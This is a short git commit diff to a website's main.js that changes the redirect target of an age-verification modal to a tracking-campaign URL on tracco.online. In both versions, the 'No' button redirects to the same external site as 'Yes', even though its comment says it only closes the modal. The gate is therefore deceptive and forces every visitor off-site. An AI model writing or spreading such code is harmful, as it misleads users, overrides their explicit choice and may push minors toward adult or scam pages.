4e1fda54aa0ce7c295a9a7c902f1196cdb4b7df5
neo1span01 <lookaditya290@gmail.com>
2026-06-04 13:15:59 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -89,12 +89,12 @@ if(form){
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', 
                                                 function(){
-    window.location.href = "https://rootix.site/?utm_campaign=MEbWXNtM8x&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "https://tracco.online/?utm_campaign=GqiZTPLbr0&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', 
                                                function(){
-    window.location.href = "https://rootix.site/?utm_campaign=MEbWXNtM8x&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "https://tracco.online/?utm_campaign=GqiZTPLbr0&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
